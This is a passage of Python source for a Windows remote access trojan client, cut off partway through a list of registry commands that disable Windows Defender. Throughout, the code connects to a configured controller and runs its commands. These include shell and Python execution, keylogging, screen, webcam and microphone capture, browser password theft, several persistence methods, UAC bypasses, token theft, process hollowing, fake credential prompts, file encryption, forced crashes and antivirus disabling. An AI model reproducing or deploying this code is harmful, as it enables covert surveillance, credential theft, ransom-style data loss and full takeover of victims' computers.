# coding=utf-8
import argparse
import base64
import contextlib
import ctypes
import datetime
import inspect
import io
import json
import locale
import logging
import os
import pathlib
import platform
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import threading
import time
import wave
import webbrowser
import winreg
import zipfile

import cv2
import ntsecuritycon
import psutil
import pyaudio
import pyautogui
import pyperclip
import requests
import tabulate
import win32api
import win32con
import win32crypt
import win32process
import win32profile
import win32security
import win32service
import win32ts
import wmi
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

from modules import askpass
from modules import filewatch
from modules import keylogger
from modules import procmon
from modules import runpe
from modules import wer

sys.path.insert(0, '/modules/')

TEMP_DIR = os.path.expanduser('~') + r'\AppData\Local\Temp'
EXECUTABLE_PATH = os.path.realpath(sys.executable)
PROG_NAME = pathlib.Path(EXECUTABLE_PATH).stem

logging.basicConfig(
    filename=os.path.join(TEMP_DIR, 'client.log'),
    format='[%(asctime)s] %(levelname)s: %(message)s',
    level=logging.DEBUG,
    datefmt='%Y-%m-%d %H:%M:%S'
)

logger = logging.getLogger(__name__)


class Client:
    def __init__(self):
        self.socket = socket.socket()
        self.host, self.port = self.load_config()
        self.logging = 1

    @staticmethod
    def load_config():
        try:
            if not getattr(sys, 'frozen', False):
                exec_dir = os.path.dirname(' '.join(sys.argv))
            else:
                exec_dir = os.path.dirname(EXECUTABLE_PATH)
            paths = [os.path.join(exec_dir, 'conf'), os.path.join(TEMP_DIR, 'conf')]
            for path in paths:
                if os.path.isfile(path):
                    exec_dir = path
                    break
            with open(exec_dir, 'r') as f:
                data = f.read().encode()
                data = base64.b64decode(data)
                config = data.decode()
                config = json.loads(config)
                return config['ip'], int(config['port'])
        except Exception as exception:
            print(exception)
            return '127.0.0.1', 9999

    def connect(self):
        while self.socket.connect_ex((self.host, self.port)) != 0:
            time.sleep(5)

    def recv(self):
        size = struct.unpack('i', self.socket.recv(4))[0]
        return self.socket.recv(size).decode()

    def recv_file(self, file):
        size = struct.unpack('i', self.socket.recv(4))[0]
        with open(file, 'wb') as f:
            while size:
                buf = self.socket.recv(size)
                size -= len(buf)
                f.write(buf)

    def send(self, status, data):
        status = struct.pack('i', status)
        size = struct.pack('i', len(data))
        self.socket.send(status + size + data)

    def send_text(self, status, data):
        self.send(status, data.encode())

    def send_file(self, filename):
        if os.path.isfile(filename):
            with open(filename, 'rb') as f:
                self.send(1, f.read())
        else:
            self.send_text(0, '[-] File not found')

    def recv_commands(self):
        command = Command()
        self.send_text(1, str(os.getcwd()) + '> ')
        cmd = self.recv()
        cmd_name = cmd.split(' ')[0]
        cmd_arg = cmd[len(cmd_name) + 1:].strip()
        if cmd == 'null':
            pass
        elif cmd == 'kill':
            self.socket.close()
            sys.exit(0)
        elif hasattr(command, cmd_name):
            func = getattr(command, cmd_name)
            args = inspect.getfullargspec(func).args
            argc = len(args)
            if not argc:
                status, data = func()
                self.send_text(status, data)
            elif 'client' in args:
                if argc == 1:
                    func(self)
                else:
                    func(self, cmd_arg)
            else:
                status, data = func(cmd_arg)
                self.send_text(status, data)
        else:
            status, data = command.execute(cmd)
            self.send_text(status, data)


class Command:
    @staticmethod
    def cd(path):
        try:
            if not path:
                return 0, 'null'
            if os.path.isdir(path):
                os.chdir(path)
                return 1, 'null'
            else:
                return 0, '[-] Cannot find the path specified'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def ls(path=None):
        try:
            paths = []
            if not path:
                path = os.getcwd()
            if not os.path.isdir(path):
                return 0, '[-] Cannot find the path specified'
            root, dirs, files = next(os.walk(path))
            for dir_name in dirs:
                paths.append([dir_name, None, Helper.get_mtime(os.path.join(root, dir_name))])
            for filename in files:
                paths.append([filename, Helper.get_readable_size(os.stat(os.path.join(root, filename)).st_size),
                              Helper.get_mtime(os.path.join(root, filename))])
            return 1, tabulate.tabulate(paths, headers=['Name', 'Size', 'Date modified'],
                                        colalign=('left', 'right',)) + os.linesep
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def execute(command):
        try:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.DEVNULL)
            result = str(cmd.stdout.read() + cmd.stderr.read(), locale.getdefaultlocale()[1])
            if not result:
                result = 'null'
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def upload(client, filename):
        try:
            client.recv_file(filename)
            client.send_text(1, '[+] File uploaded successfully')
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def download(client, filename):
        try:
            client.send_file(filename)
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def screenshot(client):
        try:
            filename = TEMP_DIR + r'\screenshot.png'
            pyautogui.screenshot(filename)
            client.send_file(filename)
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))
            return
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def webcam(client):
        try:
            filename = TEMP_DIR + r'\webcam.png'
            capture = cv2.VideoCapture(0)
            success, image = capture.read()
            if success:
                cv2.imwrite(filename, image)
                capture.release()
                client.send_file(filename)
            else:
                client.send_text(0, '[-] Webcam not found')
                return
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))
            return
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def record(client, seconds):
        chunk = 1024
        sample_format = pyaudio.paInt16
        channels = 2
        rate = 44100
        filename = TEMP_DIR + r'\output.wav'
        try:
            seconds = int(seconds)
        except:
            seconds = 10
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=sample_format, channels=channels, rate=rate, frames_per_buffer=chunk, input=True)
            frames = []
            for i in range(0, int(rate / chunk * seconds)):
                data = stream.read(chunk)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            f = wave.open(filename, 'wb')
            f.setnchannels(channels)
            f.setsampwidth(p.get_sample_size(sample_format))
            f.setframerate(rate)
            f.writeframes(b''.join(frames))
            f.close()
            client.send_file(filename)
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))
            return
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def keylogger_start():
        try:
            klg = keylogger.Keylogger().get_instance()
            if klg.status():
                return 0, '[-] Keylogger already started'
            else:
                threading.Thread(target=klg.start, daemon=True).start()
                return 1, '[+] Keylogger started'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def keylogger_stop():
        try:
            klg = keylogger.Keylogger().get_instance()
            if klg.status():
                klg.stop()
                return 1, '[+] Keylogger stopped'
            else:
                return 0, '[-] Keylogger not running'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def keylogger_save(client):
        try:
            client.send_file(TEMP_DIR + r'\output.txt')
        except Exception as exception:
            client.send_text(0, '[-] Error: ' + str(exception))

    @staticmethod
    def ps():
        try:
            processes = []
            for proc in psutil.process_iter():
                try:
                    process = [proc.pid, proc.name(), proc.exe()]
                    processes.append(process)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            return 1, tabulate.tabulate(processes, headers=['PID', 'Name', 'Executable path']) + os.linesep
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def pkill(process):
        try:
            if not process:
                return 0, '[-] No process id or name specified'
            try:
                pid = int(process)
                psutil.Process(pid).kill()
                return 1, '[+] Killed'
            except ValueError:
                for proc in psutil.process_iter():
                    if proc.name().lower() == process.lower():
                        proc.kill()
                return 1, '[+] Killed'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def run(process):
        try:
            if not process:
                return 0, '[-] No process name specified'
            p = subprocess.Popen(process)
            return 1, '[+] Process created: ' + str(p.pid)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def hiderun(process):
        try:
            if not process:
                return 0, '[-] No process name specified'
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
            info.wShowWindow = 0
            p = subprocess.Popen(process, startupinfo=info)
            return 1, '[+] Process created: {}'.format(p.pid)
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def pyexec(code):
        try:
            f = io.StringIO()
            with contextlib.redirect_stdout(f):
                exec(code)
            return 1, f.getvalue()
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def persistence_startup():
        try:
            exec_copy = os.path.join(
                os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup',
                os.path.basename(EXECUTABLE_PATH))
            shutil.copy2(EXECUTABLE_PATH, exec_copy)
            return 1, '[+] Copied to startup folder'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def persistence_registry():
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                 winreg.KEY_WRITE)
            winreg.SetValueEx(key, PROG_NAME, 0, winreg.REG_SZ, f'"{EXECUTABLE_PATH}"')
            winreg.CloseKey(key)
            return 1, '[+] Create registry key success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_schtasks():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                cmd = subprocess.Popen(
                    'schtasks.exe /create /tn {} /sc onlogon /ru system /rl highest /tr "{}" /f'.format(PROG_NAME,
                                                                                                        EXECUTABLE_PATH),
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return 1, '[+] Schedule task success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                              locale.getdefaultlocale()[1])
            else:
                return 0, '[-] Operation requires elevation'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_service():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                cmd = subprocess.Popen(
                    'sc create {} binpath= \"{}\" start= auto'.format(PROG_NAME, EXECUTABLE_PATH),
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return 1, '[+] Create service success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                               locale.getdefaultlocale()[1])
            else:
                return 0, '[-] Operation requires elevation'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_fodhelper():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                reg_path = r'Software\Classes\ms-settings\shell\open\command'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, EXECUTABLE_PATH)
                winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
                p = subprocess.Popen(r'C:\Windows\System32\fodhelper.exe', shell=True)
                p.communicate()
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
                winreg.DeleteValue(key, 'DelegateExecute')
                winreg.CloseKey(key)
                return 1, '[+] Bypass UAC success'
            else:
                return 0, '[-] Already elevated as administrator'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_clr():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                filename = 'bypassuac_clr.dll'
                if not os.path.isfile(filename):
                    return 0, '[-] Missing {}'.format(filename)
                dll_path = os.path.abspath(filename)
                reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_EXPAND_SZ, dll_path)
                winreg.CloseKey(key)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'COR_PROFILER', 0, winreg.REG_SZ, '{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}')
                winreg.SetValueEx(key, 'COR_PROFILER_PATH', 0, winreg.REG_SZ, dll_path)
                winreg.SetValueEx(key, 'COR_ENABLE_PROFILING', 0, winreg.REG_SZ, '1')
                p = subprocess.Popen('mmc eventvwr.msc', shell=True)
                p.communicate()
                winreg.DeleteValue(key, 'COR_PROFILER')
                winreg.DeleteValue(key, 'COR_PROFILER_PATH')
                winreg.DeleteValue(key, 'COR_ENABLE_PROFILING')
                winreg.CloseKey(key)
                return 1, '[+] Bypass UAC success'
            else:
                return 0, '[-] Already elevated as administrator'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_system():
        try:
            Helper.enable_privilege('SeDebugPrivilege')
            Helper.create_process_with_token(
                Helper.duplicate_token(Helper.get_process_token(Helper.get_pid('winlogon.exe'))))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_ti():
        try:
            Helper.enable_privilege('SeDebugPrivilege')
            Helper.start_service('TrustedInstaller')
            Helper.create_process_with_token(
                Helper.duplicate_token(Helper.get_process_token(Helper.get_pid('TrustedInstaller.exe'))))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_admin():
        try:
            Helper.enable_privilege('SeDebugPrivilege')
            pid = Helper.get_elevated_process()
            if pid is not None:
                Helper.create_process_as_user(
                    Helper.duplicate_token(Helper.get_process_token(pid)))
                return 1, '[+] Success'
            else:
                return 0, '[-] No elevated process found'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_user():
        try:
            Helper.enable_privilege('SeTcbPrivilege')
            Helper.create_process_as_user(Helper.duplicate_token(Helper.get_user_token()))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_admin():
        try:
            Helper.enable_privilege('SeTcbPrivilege')
            Helper.create_process_as_user(Helper.duplicate_token(Helper.get_linked_token(Helper.get_user_token())))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def get_passwords(browser):
        try:
            user_data = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data'
            passwords = Helper.get_passwords(Helper.get_master_key(user_data + r'\Local State'),
                                             user_data + r'\Default\Login Data')
            return 1, json.dumps(passwords, sort_keys=False, indent=4, ensure_ascii=False)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def get_bookmarks(browser):
        try:
            default = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data\Default'
            return 1, Helper.get_bookmarks(default + r'\Bookmarks')
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def get_history(browser):
        try:
            default = os.environ['LOCALAPPDATA'] + Helper.browser_dict[browser] + r'\User Data\Default'
            history = Helper.get_history(default + r'\History')
            return 1, json.dumps(history, sort_keys=False, indent=4, ensure_ascii=False)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def getinfo():
        try:
            computer = wmi.WMI()
            computer_info = computer.Win32_ComputerSystem()[0]
            gpu_info = computer.Win32_VideoController()[0]
            proc_info = computer.Win32_Processor()[0]
            info = {'pid': psutil.Process().pid, 'username': psutil.Process().username(), 'exec_path': EXECUTABLE_PATH,
                    'intgty_lvl': Helper.get_integrity_level(), 'uac_lvl': Helper.get_uac_level(),
                    'hostname': platform.node(), 'platform': platform.system(), 'version': platform.version(),
                    'architecture': platform.machine(), 'manufacturer': computer_info.Manufacturer,
                    'model': computer_info.Model,
                    'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + ' GB', 'cpu': proc_info.Name,
                    'graphic_card': gpu_info.name}
            result = ''
            for k, v in info.items():
                result += '{0:15}{1}'.format(k, v) + '\n'
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def idletime():
        try:
            return 1, '[+] User has been idle for: ' + str(
                (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0) + ' seconds'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def drives():
        try:
            parts = []
            partitions = psutil.disk_partitions()
            for partition in partitions:
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                except PermissionError:
                    continue
                part = [partition.device, partition.fstype, Helper.get_readable_size(partition_usage.total),
                        Helper.get_readable_size(partition_usage.used),
                        Helper.get_readable_size(partition_usage.free), str(partition_usage.percent) + ' %']
                parts.append(part)

            return 1, tabulate.tabulate(parts,
                                        headers=['Mount point', 'File system', 'Total size', 'Used', 'Free',
                                                 'Percentage']) + os.linesep
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def startup():
        try:
            c = wmi.WMI()
            startup = []
            for s in c.Win32_StartupCommand():
                startup.append([s.Caption, s.Command, s.Location])
            return 1, tabulate.tabulate(sorted(startup), headers=['Caption', 'Command', 'Location']) + os.linesep
        except Exception as exception:
            return 0, '[-] {}'.format(exception)

    @staticmethod
    def software():
        try:
            software_list = []
            for item in ((winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY),
                         (winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY),
                         (winreg.HKEY_CURRENT_USER, 0)):
                software_list += Helper.enum_uninstall_key(*item)
            return 1, tabulate.tabulate(sorted(software_list, key=lambda s: s[0].lower()),
                                        headers=['Name', 'Version', 'Publisher']) + os.linesep
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def ifeo_debugger(args):
        try:
            status, result = Helper.parse_arguments({'exec': True, 'debugger': False}, args)
            if not status:
                return 0, '[-] Error: {}'.format(result)
            debugger = result['debugger'] if result['debugger'] else EXECUTABLE_PATH
            reg_path = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{}'.format(
                result['exec'])
            winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'debugger', 0, winreg.REG_SZ, debugger)
            winreg.CloseKey(key)
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def ifeo_globalflag(exec):
        try:
            if not exec:
                return 0, '[-] No executable name specified'
            if not ctypes.windll.shell32.IsUserAnAdmin():
                return 0, '[-] Operation requires elevation'
            cmd_list = [
                r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution '
                r'Options\{}" /v GlobalFlag /t REG_DWORD /d 512 /f'.format(exec),
                r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{}" /v '
                r'ReportingMode /t REG_DWORD /d 1 /f'.format(exec),
                r'reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\{}" /v '
                r'MonitorProcess /d {} /f'.format(exec, EXECUTABLE_PATH)
            ]
            result = ''
            for cmd in cmd_list:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
            return 1, result
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def runpe(args):
        try:
            status, result = Helper.parse_arguments({'src': False, 'dst': False}, args)
            if not status:
                return 0, '[-] Error: {}'.format(result)
            src = result['src'] if result['src'] else r'c_client.exe'
            dst = result['dst'] if result['dst'] else r'C:\Windows\explorer.exe'
            if not os.path.isfile(src):
                return 0, '[-] File not found: {}'.format(src)
            elif not os.path.isfile(dst):
                return 0, '[-] File not found: {}'.format(dst)
            else:
                return 1, runpe.hollow_process(src, dst)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def poweroff():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.ZwShutdownSystem(2)

    @staticmethod
    def bsod():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc000021a, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

    @staticmethod
    def setcritical(flag):
        try:
            flag = flag.lower() in ('true', '1', '')
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            result = ctypes.windll.ntdll.RtlSetProcessIsCritical(flag, 0, 0)
            if not result:
                return 1, '[+] Success'
            else:
                return 0, '[-] Error: {}'.format(result)
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def msgbox(args):
        try:
            status, result = Helper.parse_arguments({'text': True, 'title': False}, args)
            if not status:
                return 0, '[-] Error: {}'.format(result)
            threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(None, result['text'], result['title'], 0),
                             daemon=True).start()
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def askuac():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                if not getattr(sys, 'frozen', False):
                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable,
                                                                 '"{}"'.format(' '.join(sys.argv)),
                                                                 None, 1)
                else:
                    exec_copy = os.path.join(TEMP_DIR, os.path.basename(EXECUTABLE_PATH))
                    shutil.copy2(EXECUTABLE_PATH, exec_copy)
                    result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', r'C:\Windows\system32\cmd.exe',
                                                                 ' /c "{}"'.format(exec_copy),
                                                                 None, 1)
                if result > 32:
                    return 1, '[+] Success'
                else:
                    return 0, '[-] Error: {}'.format(result)
            else:
                return 0, '[-] Already elevated as administrator'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def askpass():
        try:
            cmd1 = '$cred=$host.ui.promptforcredential(\'Windows Security\',\'\',[Environment]::Username,' \
                   '[Environment]::UserDomainName); '
            cmd2 = 'echo $cred.getnetworkcredential().password;'
            while True:
                p = subprocess.Popen('powershell.exe "{} {}"'.format(cmd1, cmd2), shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE)
                username = os.getlogin()
                password = p.stdout.read().decode().strip()
                if askpass.logon_user(username, password):
                    return 1, password
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def askpass_dim(client):
        def func(result):
            client.send_text(1, result)

        try:
            askpass.switch_desktop(func)
        except Exception as exception:
            client.send_text(0, '[-] {}'.format(exception))

    @staticmethod
    def zip(path=None):
        try:
            if path is None or not os.path.exists(path):
                path = os.getcwd()
            src = pathlib.Path(path)
            zip_name = os.path.basename(path) + '.zip'
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
                files = filter(lambda x: not x.name == zip_name, src.rglob('*'))
                for file in files:
                    zf.write(file, file.relative_to(src.parent))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def unzip(filename):
        try:
            if os.path.isfile(filename):
                shutil.unpack_archive(filename, os.getcwd())
                return 1, '[-] Success'
            else:
                return 0, '[-] File not found'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def openwin():
        try:
            titles = []
            for window in pyautogui.getAllWindows():
                if window.title.strip():
                    titles.append(window.title)
            return 1, '\n'.join(titles)
        except Exception as exception:
            return 0, '[-] Error: ' + str(exception)

    @staticmethod
    def activewin():
        try:
            return 1, pyautogui.getActiveWindowTitle()
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def getclip():
        try:
            return 1, pyperclip.paste()
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def setclip(text):
        try:
            pyperclip.copy(text)
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def filewatch(client, path=None):
        event = threading.Event()

        def func(result):
            client.send_text(1, result)

        def eof():
            client.send_text(-1, 'null')
            event.set()

        if path is None or not os.path.exists(path):
            path = os.path.join(os.path.expanduser('~'), 'Desktop')
        fw = filewatch.FileWatch().get_instance()
        fw.start_monitor(path, func, eof)
        while True:
            cmd = client.recv()
            if cmd == 'stop':
                fw.stop_monitor()
                event.wait()
                break

    @staticmethod
    def procmon_start(args):
        try:
            pm = procmon.ProcessMonitor().get_instance()
            if pm.status:
                return 0, '[-] Already running'
            status, result = Helper.parse_arguments({'cmd': True, 'process': True}, args)
            if not status:
                return 0, '[-] Error: {}'.format(result)
            cmd = result['cmd']
            process = [x.strip() for x in result['process'].split(',')]
            if hasattr(Command, cmd):
                func = getattr(Command, cmd)
            else:
                return 0, '[-] No such command: {}'.format(cmd)
            threading.Thread(target=pm.start, args=(process, func,)).start()
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def procmon_stop():
        pm = procmon.ProcessMonitor().get_instance()
        if not pm.status:
            return 0, '[-] Not running'
        pm.stop()
        return 1, '[+] Success'

    @staticmethod
    def encrypt(path=None):
        try:
            key = get_random_bytes(32)
            with open(TEMP_DIR + r'\encrypted.bin', 'wb') as f:
                f.write(key)
            if not path:
                path = os.getcwd()
            if os.path.isfile(path):
                Helper.encrypt_file(path, key)
            elif os.path.isdir(path):
                for root, subdirs, files in os.walk(path):
                    for filename in files:
                        try:
                            Helper.encrypt_file(os.path.join(root, filename), key)
                        except:
                            pass
            else:
                return 0, '[-] No such file or directory'
            return 1, base64.b64encode(key).decode()
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def decrypt(args):
        try:
            status, result = Helper.parse_arguments({'path': False, 'key': True}, args)
            if not status:
                return 0, '[-] Error: {}'.format(result)
            path = result['path'] if result['path'] else os.getcwd()
            key = base64.b64decode(result['key'])
            if os.path.isfile(path):
                Helper.decrypt_file(path, key)
            elif os.path.isdir(path):
                for root, subdirs, files in os.walk(path):
                    for filename in files:
                        try:
                            Helper.decrypt_file(os.path.join(root, filename), key)
                        except:
                            pass
            else:
                return 0, '[-] No such file or directory'
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def freeze(flag):
        try:
            flag = flag.lower() in ('true', '1', '')
            if ctypes.windll.shell32.IsUserAnAdmin():
                ctypes.windll.user32.BlockInput(flag)
                return 1, '[+] {}'.format(flag)
            else:
                return 0, '[-] Operation requires elevation'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def openurl(url):
        try:
            if not url:
                return 0, '[-] URL required'
            webbrowser.open(url)
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def wallpaper(filename):
        try:
            if os.path.isfile(filename):
                ctypes.windll.user32.SystemParametersInfoW(20, 0, str(os.path.realpath(filename)), 0)
                return 1, '[+] Success'
            else:
                return 0, '[-] File not found'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def hideme():
        try:
            win32api.SetFileAttributes(EXECUTABLE_PATH, 0x02 | 0x04)
            return 1, str(win32api.GetFileAttributes(EXECUTABLE_PATH))
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def killwd_sandbox():
        try:
            if Helper.get_integrity_level() != 'System':
                return 0, '[-] System permission required'
            Helper.enable_privilege('SeDebugPrivilege')
            pid = Helper.get_pid('MsMpEng.exe')
            handle_process = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
            handle_token = win32security.OpenProcessToken(handle_process, win32con.TOKEN_ALL_ACCESS)
            Helper.remove_privilege(handle_token, 'SeAssignPrimaryTokenPrivilege')
            Helper.remove_privilege(handle_token, 'SeBackupPrivilege')
            Helper.remove_privilege(handle_token, 'SeChangeNotifyPrivilege')
            Helper.remove_privilege(handle_token, 'SeDebugPrivilege')
            Helper.remove_privilege(handle_token, 'SeImpersonatePrivilege')
            Helper.remove_privilege(handle_token, 'SeIncreaseBasePriorityPrivilege')
            Helper.remove_privilege(handle_token, 'SeIncreaseQuotaPrivilege')
            Helper.remove_privilege(handle_token, 'SeLoadDriverPrivilege')
            Helper.remove_privilege(handle_token, 'SeRestorePrivilege')
            Helper.remove_privilege(handle_token, 'SeSecurityPrivilege')
            Helper.remove_privilege(handle_token, 'SeShutdownPrivilege')
            Helper.remove_privilege(handle_token, 'SeSystemEnvironmentPrivilege')
            Helper.remove_privilege(handle_token, 'SeTakeOwnershipPrivilege')
            Helper.remove_privilege(handle_token, 'SeTcbPrivilege')
            untrusted_integrity_sid = win32security.GetBinarySid('S-1-16-0')
            win32security.SetTokenInformation(handle_token, ntsecuritycon.TokenIntegrityLevel,
                                              (untrusted_integrity_sid, 28))
            return 1, '[+] Success'
        except Exception as exception:
            return 0, '[-] Error: {}'.format(exception)

    @staticmethod
    def killwd_registry():
        try:
            cmd_list = [
                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f',
                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f',
